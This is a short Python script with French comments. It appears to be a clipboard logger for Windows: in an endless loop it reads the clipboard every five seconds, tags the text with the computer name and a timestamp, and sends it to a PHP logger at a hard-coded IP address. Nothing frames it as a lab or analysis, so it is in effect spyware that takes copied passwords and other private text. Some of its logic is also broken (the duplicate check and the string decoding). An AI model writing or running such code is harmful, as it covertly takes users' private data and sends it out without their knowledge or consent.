# coding:utf-8
# pip install pywin32
import win32clipboard as clip
import requests
import time
import os

def get_clip():
    # Variables
    global data
    global donnees
    date = time.strftime("%Y%m%d_%H%M%S")
    pc_name = os.environ['COMPUTERNAME']
    clip_name = pc_name + "_" + date + '\n'
    # Ouverture du Clipboard
    clip.OpenClipboard()
    # Récupération du contenu du clipboard
    data = clip.GetClipboardData()
    # Fermeture du clipboard pour ne pas impacter la fonction
    clip.CloseClipboard()
    donnees = (clip_name + data).replace('\n', '|| ')

def send(donnees):
    # AVEC REQUESTS
    url = 'http://192.168.35.68:8080/logger.php?log='
    url_log = url + donnees
    res = requests.post(url_log, data=donnees.decode("utf-8"))
    print(res.text)

def main():
    while True:
        get_clip()
        data_sent = ''
        if data != data_sent :
            send(donnees)
            data_sent = data
        time.sleep(5)

main()
